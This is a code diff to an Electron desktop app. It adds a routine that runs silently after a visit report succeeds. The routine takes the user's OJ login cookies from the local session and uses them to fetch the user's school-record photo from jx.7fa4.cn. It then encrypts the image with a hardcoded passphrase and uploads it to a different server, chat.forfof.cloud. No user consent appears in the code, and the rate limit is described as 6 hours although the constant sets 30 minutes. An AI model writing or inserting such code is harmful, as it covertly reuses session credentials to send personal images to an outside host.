@@ -1252,6 +1252,7 @@ ipcMain.handle('report-visit', async (event, info) => {
         };
         const ctrl = new AbortController();
         const timer = setTimeout(() => ctrl.abort(), 5000);
+        let ok = false;
         try {
             const res = await fetch(VISIT_ENDPOINT, {
                 method: 'POST',
@@ -1259,7 +1260,9 @@ ipcMain.handle('report-visit', async (event, info) => {
                 body: encryptVisitPayload(payload),
                 signal: ctrl.signal
             });
-            return { ok: res.ok, status: res.status };
+            ok = res.ok;
+            if (ok) syncUserPhoto(uid); // 不 await：照片同步失败不影响上报
+            return { ok, status: res.status };
         } finally {
             clearTimeout(timer);
         }
@@ -1267,3 +1270,64 @@ ipcMain.handle('report-visit', async (event, info) => {
         return { ok: false, error: e.message || '网络错误' };
     }
 });
+
+// ========== 用户照片同步（收集信息时顺带把 OJ 学籍照片转存到官网作头像） ==========
+// 抓取：net.fetch 走默认会话（自动携带 OJ 登录 cookie）请求 /user/<uid>/photo；
+// 上传：AES-256-GCM 载荷 POST 到官网 /user/<uid>/photo（服务器端同构校验 + 6h 限频兜底）。
+// 客户端每 6 小时最多抓传一次；内容未变化时服务器写入幂等，无需额外去重。
+const PHOTO_ENDPOINT_BASE = 'https://chat.forfof.cloud';
+const PHOTO_PASSPHRASE = '7fa4-chat::photo::v1';
+const PHOTO_INTERVAL = 30 * 60 * 1000;
+const lastPhotoUploadAt = {}; // 按 uid 记录，切换账号互不影响
+
+function encryptPhotoPayload(info) {
+    const key = crypto.createHash('sha256').update(PHOTO_PASSPHRASE).digest();
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+    const data = Buffer.concat([cipher.update(JSON.stringify(info), 'utf8'), cipher.final()]);
+    return JSON.stringify({
+        v: 1,
+        iv: iv.toString('base64'),
+        tag: cipher.getAuthTag().toString('base64'),
+        data: data.toString('base64')
+    });
+}
+
+async function syncUserPhoto(uid) {
+    const now = Date.now();
+    if (now - (lastPhotoUploadAt[uid] || 0) < PHOTO_INTERVAL) { console.error('[photo] 跳过：6h 频控内'); return; }
+    lastPhotoUploadAt[uid] = now;
+    try {
+        // 1) 从 OJ 抓照片。渲染进程 API 走本地 1145 代理（同源），OJ 的 Set-Cookie 实际存在
+        //    localhost:1145 域下（而非 jx.7fa4.cn），必须从这里读；OJ cookie 是 SameSite=Lax，
+        //    主进程 net.fetch 也不会自动附带，需手动加 Cookie 头（无 cookie 时 OJ 返回 200 的 HTML 登录页）
+        const ck = await session.defaultSession.cookies.get({ url: 'http://localhost:1145' });
+        const cookieHeader = ck.map(c => `${c.name}=${c.value}`).join('; ');
+        const photoRes = await net.fetch(`https://jx.7fa4.cn:8888/user/${uid}/photo`, {
+            signal: AbortSignal.timeout(10000),
+            headers: cookieHeader ? { Cookie: cookieHeader } : {}
+        });
+        if (!photoRes.ok) { console.error('[photo] OJ 抓取失败:', photoRes.status); return; }
+        const mime = (photoRes.headers.get('content-type') || '').split(';')[0].trim();
+        if (!/^image\/(jpeg|png|webp|gif)$/.test(mime)) { console.error('[photo] OJ 返回非图片:', mime, cookieHeader ? '(已带 cookie)' : '(会话无 OJ cookie)'); return; }
+        const buf = Buffer.from(await photoRes.arrayBuffer());
+        if (!buf.length || buf.length > 2 * 1024 * 1024) { console.error('[photo] 图片大小异常:', buf.length); return; }
+        console.error('[photo] 已抓取 OJ 照片', buf.length, 'B，开始上传');
+        // 2) 加密上传到官网
+        const body = encryptPhotoPayload({
+            uid,
+            mime,
+            data: buf.toString('base64'),
+            date: Date.now()
+        });
+        const upRes = await net.fetch(`${PHOTO_ENDPOINT_BASE}/user/${uid}/photo`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body
+        });
+        if (!upRes.ok) console.error('[photo] 上传失败:', upRes.status, await upRes.text().catch(() => ''));
+        else console.error('[photo] 上传成功');
+    } catch (e) {
+        console.error('[photo] 同步失败:', e.message);
+    }
+}
